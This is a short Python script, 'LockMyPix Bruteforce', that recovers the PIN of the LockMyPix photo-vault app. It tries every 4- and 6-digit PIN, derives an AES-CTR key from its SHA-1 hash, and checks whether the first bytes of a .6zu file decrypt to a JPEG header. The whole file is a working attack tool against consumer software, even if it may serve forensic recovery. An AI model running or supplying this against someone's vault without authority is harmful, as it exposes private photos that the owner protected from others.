######################################################
# This script will only bruteforce 4 or 6 digit PINs #
# Can be modified to include longer PINs             #
######################################################
import argparse
import logging
import hashlib
from Crypto.Cipher import AES
from Crypto.Util import Counter
import binascii

logging.basicConfig(
    level=logging.DEBUG,
    format='[%(levelname)s] %(asctime)s %(message)s',
    datefmt='%d-%m-%Y %H:%M:%S',
)


def four_digit_pin(input):
    logging.info("Beginning 4 digit PIN bruteforce")
    four_digit = [f"{i:04}" for i in range(10000)]
    for pin in four_digit:
        key = hashlib.sha1(pin.encode()).digest()[:16]
        iv = key
        counter = Counter.new(128, initial_value=int.from_bytes(iv, "big"))
        cipher = AES.new(key, AES.MODE_CTR, counter=counter)
        with open(input, "rb") as enc_data:
            dec_data = cipher.decrypt(enc_data.read(16))
            header = binascii.hexlify(dec_data).decode("utf8")
            if header.startswith("ffd8ff"):
                logging.info(f"PIN found: {pin}")
                return pin
            else:
                continue


def six_digit_pin(input):
    logging.info("Beginning 6 digit PIN bruteforce")
    four_digit = [f"{i:06}" for i in range(1000000)]
    for pin in four_digit:
        key = hashlib.sha1(pin.encode()).digest()[:16]
        iv = key
        counter = Counter.new(128, initial_value=int.from_bytes(iv, "big"))
        cipher = AES.new(key, AES.MODE_CTR, counter=counter)
        with open(input, "rb") as enc_data:
            dec_data = cipher.decrypt(enc_data.read(16))
            header = binascii.hexlify(dec_data).decode("utf8")
            if header.startswith("ffd8ff"):
                logging.info(f"PIN found: {pin}")
                return pin
            else:
                continue


def bruteforce(input):
    if not input.endswith(".6zu"):
        logging.warning("Script requires a .6zu file")
        raise SystemExit(1)
    if four_digit_pin(input):
        raise SystemExit(1)
    if six_digit_pin(input):
        raise SystemExit(1)

    logging.info("Could not find PIN, could possibly not be a 4 or 6 digits")


def main():
    parser = argparse.ArgumentParser("LockMyPix Bruteforce")
    parser.add_argument("input",
                        help="Path to .6zu file")
    args = parser.parse_args()
    bruteforce(args.input)


if __name__ == "__main__":
    main()
